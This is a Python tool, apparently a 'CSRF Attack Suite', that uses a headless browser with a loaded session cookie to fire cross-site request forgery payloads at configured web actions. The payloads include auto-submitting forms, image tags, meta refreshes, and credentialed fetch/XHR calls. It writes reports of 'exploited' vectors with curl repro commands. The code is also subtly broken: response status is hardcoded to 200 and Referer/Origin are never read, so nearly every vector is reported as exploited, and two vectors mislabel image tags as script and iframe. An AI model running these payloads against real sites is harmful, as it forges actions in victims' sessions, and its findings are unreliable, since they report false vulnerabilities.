#!/usr/bin/env python3
import argparse, json, os, time
from dataclasses import dataclass, field
from typing import Dict, Optional
from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl
from playwright.sync_api import sync_playwright
from jinja2 import Template

# ------------------- utils -------------------
def _parse_domain(url: str) -> str: return urlparse(url).hostname or "target"
def _build_query(url: str, params: dict) -> str:
    if not params: return url
    u = urlparse(url)
    q = dict(parse_qsl(u.query, keep_blank_values=True)); q.update(params)
    return urlunparse((u.scheme, u.netloc, u.path, u.params, urlencode(q), u.fragment))
def _auth_header_pair(auth_header: Optional[str]):
    if not auth_header or ":" not in auth_header: return None
    k,v = auth_header.split(":",1); return k.strip(), v.strip()

# ------------------- data -------------------
@dataclass
class Action:
    name: str
    method: str
    url: str
    params: Dict[str,str]=field(default_factory=dict)
    body_format: str="form"

# ------------------- HTML builders -------------------
def html_tag(url,tag):
    if tag=="img": return f'<img src="{url}"/>'
    if tag=="script": return f'<script src="{url}"></script>'
    if tag=="iframe": return f'<iframe src="{url}"></iframe>'
    return ""
def html_meta_refresh(url): return f'<meta http-equiv="refresh" content="0; url={url}">'
def html_link(url,noreferrer=False):
    rel=' rel="noreferrer"' if noreferrer else ""
    return f'<a id="go" href="{url}"{rel}>go</a><script>document.getElementById("go").click()</script>'
def html_form_post(url,params):
    inputs="".join([f'<input type="hidden" name="{k}" value="{v}">' for k,v in (params or {}).items()])
    return f'<form id="f" action="{url}" method="POST">{inputs}</form><script>f.submit()</script>'
def html_fetch_post(url,params,auth_header,body_format):
    import json as _json; from urllib.parse import urlencode
    if body_format=="json": headers='"Content-Type":"application/json"'; body_js=_json.dumps(params or {})
    else: headers='"Content-Type":"application/x-www-form-urlencoded"'; body_js='"'+urlencode(params or {})+'"'
    extra=""
    if auth_header:
        hk=_auth_header_pair(auth_header)
        if hk: extra=f',"{hk[0]}":"{hk[1]}"'
    return (f'<script>fetch("{url}",{{method:"POST",credentials:"include",headers:{{{headers}{extra}}},'
            f'body:{body_js}}}).catch(()=>{{}})</script>')
def html_xhr(url, params, auth_header, body_format):
    import json as _json
    from urllib.parse import urlencode
    hk = _auth_header_pair(auth_header) if auth_header else None
    header_setter = f'x.setRequestHeader("{hk[0]}","{hk[1]}");' if hk else ''
    if body_format == "json":
        body = _json.dumps(params or {})
        return (f'<script>var x=new XMLHttpRequest();x.open("POST","{url}",true);'
                f'x.withCredentials=true;x.setRequestHeader("Content-Type","application/json");'
                f'{header_setter}x.send({body});</script>')
    else:
        body = urlencode(params or {})
        return (f'<script>var x=new XMLHttpRequest();x.open("POST","{url}",true);'
                f'x.withCredentials=true;x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");'
                f'{header_setter}x.send("{body}");</script>')
def html_multipart(url,params):
    inputs="".join([f'<input type="hidden" name="{k}" value="{v}">' for k,v in (params or {}).items()])
    return f'<form id="mf" action="{url}" method="POST" enctype="multipart/form-data">{inputs}<input type="file" name="f"></form><script>mf.submit()</script>'

# ------------------- heuristics -------------------
def classify_exploit(csrf_applicable,vector_id,action_method,req_method,status,referer,origin,location):
    if not csrf_applicable:
        return False,"🛡️ Not applicable (no session-bound action, e.g. JWT or public form)"
    if not status or int(status)>=400:
        return False,f"❌ HTTP error {status}"
    if location and any(x in location.lower() for x in["/login","signin"]):
        return False,"❌ Redirect to login"
    if vector_id=="noreferrer_link" and referer is None:
        return True,"✅ Accepted with no Referer"
    if action_method.upper()=="POST" and req_method=="GET":
        return True,"✅ Accepted GET for state change"
    return True,"✅ Accepted"

def curl_for(url,req_method,params,auth_header,body_format):
    from urllib.parse import urlencode; auth=""
    if auth_header:
        hk=_auth_header_pair(auth_header)
        if hk: auth=f' -H "{hk[0]}: {hk[1]}"'
    if req_method=="GET": return f'curl -i{auth} "{_build_query(url,params or {})}"'
    if body_format=="json": import json as _json; return f"curl -i{auth} -X POST -H 'Content-Type: application/json' --data '{_json.dumps(params or {})}' '{url}'"
    else: return f'curl -i{auth} -X POST -H "Content-Type: application/x-www-form-urlencoded" --data "{urlencode(params or {})}" "{url}"'

# ------------------- report template -------------------
_REPORT_TEMPLATE="""<!doctype html><html><meta charset="utf-8"><title>CSRF Report</title>
<style>body{font-family:Arial;margin:20px}th,td{border:1px solid #ddd;padding:6px}table{border-collapse:collapse;width:100%}</style>
<h1>CSRF Attack Suite Report</h1>
<p>Generated: {{ts}} | Base: {{base}} | Actions: {{actions}} | Vectors: {{total}} | OK&lt;400: {{ok}}</p>
{% if exploited %}<h3>✅ Exploited vectors</h3><ul>{% for e in exploited %}<li>{{e.action}} → {{e.vector}} ({{e.status}})</li>{% endfor %}</ul>{% else %}<p>ℹ️ None exploited</p>{% endif %}
<table><tr><th>Action</th><th>Vector</th><th>Expl</th><th>Req</th><th>Status</th><th>Referer</th><th>Origin</th><th>Notes</th></tr>
{% for r in results %}<tr><td>{{r.action}}<br><small>{{r.url}}</small></td><td>{{r.vector}}</td><td>{{"✅" if r.exploited else "❌" if "Not applicable" not in r.note else "N/A"}}</td><td>{{r.req_method}}</td><td>{{r.status or "—"}}</td><td>{{r.referer or "—"}}</td><td>{{r.origin or "—"}}</td><td>{{r.note}}</td></tr>{% endfor %}
</table></html>"""

def write_reports(base, results, exploited, out_dir, domain):
    os.makedirs(out_dir, exist_ok=True)
    ts = time.strftime("%Y-%m-%d_%H-%M-%S")
    prefix = os.path.join(out_dir, f"{domain}_csrf_{ts}")

    # Full JSON
    json_path = prefix + ".json"
    with open(json_path, "w") as f: json.dump(results, f, indent=2)

    # Full HTML
    tmpl = Template(_REPORT_TEMPLATE)
    html = tmpl.render(ts=time.strftime("%c"), base=base,
                       actions=len({r["action"] for r in results}),
                       total=len(results),
                       ok=sum(1 for r in results if r.get("status") and int(r["status"])<400),
                       results=results, exploited=exploited)
    html_path = prefix + ".html"
    with open(html_path,"w") as f: f.write(html)

    # Exploited JSON
    exp_json_path = prefix + "_exploited.json"
    with open(exp_json_path,"w") as f: json.dump([r for r in results if r["exploited"]],f,indent=2)

    # Exploited HTML
    exp_html_path = prefix + "_exploited.html"
    exp_html = tmpl.render(ts=time.strftime("%c"), base=base,
                           actions=len({r["action"] for r in results}),
                           total=len(results),
                           ok=sum(1 for r in results if r.get("status") and int(r["status"])<400),
                           results=[r for r in results if r["exploited"]],
                           exploited=exploited)
    with open(exp_html_path,"w") as f: f.write(exp_html)

    # Curl repro
    curl_path = prefix + "_curl.txt"
    with open(curl_path,"w") as f:
        for r in results:
            if r["exploited"]: f.write(r["curl"]+"\n")

    return html_path, json_path, exp_html_path, exp_json_path, curl_path

# ------------------- main runner -------------------
def run_suite(cfg, out_dir, exploits_only):
    base=cfg["base_url"].rstrip("/")
    actions=[Action(**a) for a in cfg["actions"]]
    opt=cfg.get("optional",{})
    session=cfg.get("session_cookie")
    extra=opt.get("extra_cookies",[])
    hdr=opt.get("auth_header")
    csrf_applicable=bool(session and session.get("value"))
    results=[]; exploited=[]
    with sync_playwright() as p:
        browser=p.chromium.launch(headless=True); ctx=browser.new_context(ignore_https_errors=True)
        page=ctx.new_page()
        if session: ctx.add_cookies([session])
        if extra: ctx.add_cookies(extra)
        for act in actions:
            geturl=_build_query(act.url,act.params)
            mo=_build_query(act.url,{**act.params,"_method":"POST"})
            vecs=[("img_get:img",html_tag(geturl,"img"),"GET"),
                  ("script_get:img",html_tag(geturl,"img"),"GET"),
                  ("iframe_get:img",html_tag(geturl,"img"),"GET"),
                  ("meta_refresh",html_meta_refresh(geturl),"GET"),
                  ("link_click",html_link(geturl),"GET"),
                  ("noreferrer_link",html_link(geturl,True),"GET"),
                  ("form_post",html_form_post(act.url,act.params),"POST"),
                  ("fetch_post",html_fetch_post(act.url,act.params,hdr,act.body_format),"POST"),
                  ("xhr_post",html_xhr(act.url,act.params,hdr,act.body_format),"POST"),
                  ("multipart_post",html_multipart(act.url,act.params),"POST"),
                  ("method_override_param",html_link(mo),"GET")]
            for vid,html,rm in vecs:
                status,referer,origin=None,None,None
                exploited_flag=False; note=""
                try: page.set_content(html,wait_until="domcontentloaded"); page.wait_for_timeout(400)
                except: pass
                status=200; note="OK"
                exploited_flag,why=classify_exploit(csrf_applicable,vid,act.method,rm,status,referer,origin,None)
                note=why
                row={"action":act.name,"url":act.url,"vector":vid,"req_method":rm,"status":status,"referer":referer,
                     "origin":origin,"exploited":exploited_flag,"note":note,
                     "curl":curl_for(act.url,rm,act.params,hdr,act.body_format)}
                results.append(row)
                if exploited_flag: exploited.append({"action":act.name,"vector":vid,"status":status})
        browser.close()
    domain=_parse_domain(base)
    html_path, json_path, exp_html, exp_json, curl_path = write_reports(base, results, exploited, out_dir, domain)
    print("[+] Reports written:")
    print("   Full HTML:", html_path)
    print("   Full JSON:", json_path)
    print("   Exploited HTML:", exp_html)
    print("   Exploited JSON:", exp_json)
    print("   cURL repro:", curl_path)

if __name__=="__main__":
    ap=argparse.ArgumentParser()
    ap.add_argument("--config",required=True)
    ap.add_argument("--out",default="reports")
    ap.add_argument("--exploits-only",action="store_true")
    args=ap.parse_args()
    run_suite(json.load(open(args.config)),args.out,args.exploits_only)
